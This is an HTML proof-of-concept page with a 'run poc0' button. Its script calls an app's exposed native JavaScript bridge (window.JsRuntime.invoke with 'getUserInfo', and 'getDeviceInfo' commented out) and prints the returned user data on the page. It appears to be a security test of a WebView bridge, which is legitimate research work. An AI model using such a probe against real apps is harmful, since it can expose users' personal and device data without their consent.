<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <title>test</title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 15vh 20px 0;
            /* 关键修改：顶部15%视口高度 */
            background: #f0f2f5;
            box-sizing: border-box;
        }

        pre {
            padding: 20px;
            border: 1px solid #ddd;
            background: #fff;
            white-space: pre-wrap;
            width: 600px;
            min-height: 200px;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
            margin-top: 30px;
            /* 增加按钮与显示区域的间距 */
        }

        button {
            padding: 12px 32px;
            background: #007bff;
            color: white;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 16px;
            transition: all 0.3s;
            transform: translateY(20%);
            /* 初始位置下移 */
        }

        button:hover {
            background: #0056b3;
            transform: translateY(15%);
            /* 悬停微调位置 */
        }

        @media (max-height: 600px) {
            body {
                padding-top: 80px;
                /* 小屏幕固定顶部距离 */
            }
        }
    </style>
</head>

<body>
    <button onclick="runPoc()">run poc0</button>
    <pre id="raw-output">test</pre>

    <script>
        window.jsb = {
            handleMessage: function (response) {
                const output = document.getElementById('raw-output');
                try {
                    const rawString = typeof response === 'string'
                        ? response
                        : JSON.stringify(response, null, 2);
                    output.textContent = rawString;
                } catch (e) {
                    output.textContent = `解析错误: ${e.message}`;
                }
            }
        };

        function runPoc() {
            const output = document.getElementById('raw-output');
            output.textContent = "请求发送中...";

            try {
                const callbackId = `dev_${Date.now()}`;
                // window.JsRuntime.invoke('getDeviceInfo', '{}', callbackId);
                window.JsRuntime.invoke('getUserInfo', '{}', callbackId);
            } catch (error) {
                output.textContent = `请求失败: ${error.message}`;
            }
        }
    </script>
</body>

</html>
